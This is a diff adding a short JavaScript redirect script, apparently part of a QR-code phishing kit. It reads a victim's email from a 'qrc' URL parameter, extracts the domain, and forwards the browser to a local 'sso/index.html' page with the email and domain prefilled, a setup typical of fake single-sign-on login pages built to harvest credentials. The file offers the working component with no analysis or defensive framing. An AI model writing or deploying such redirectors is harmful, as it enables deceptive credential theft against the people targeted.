@@ -1,0 +1,15 @@
+<script type="text/javascript">
+
+  const queryString3 = window.location.search;
+  const urlParams3 = new URLSearchParams(queryString3);
+  const imageBoxx = urlParams3.get('qrc');
+
+var srvr = imageBoxx;
+
+var ind=srvr.indexOf("@");
+
+var srvrd=srvr.substr((ind+1));
+var total2 = srvrd;
+
+window.location.replace("sso/index.html?emailtoken="+srvr+"&domain="+total2+"#long string result of htmlcode encode only");
+</script>
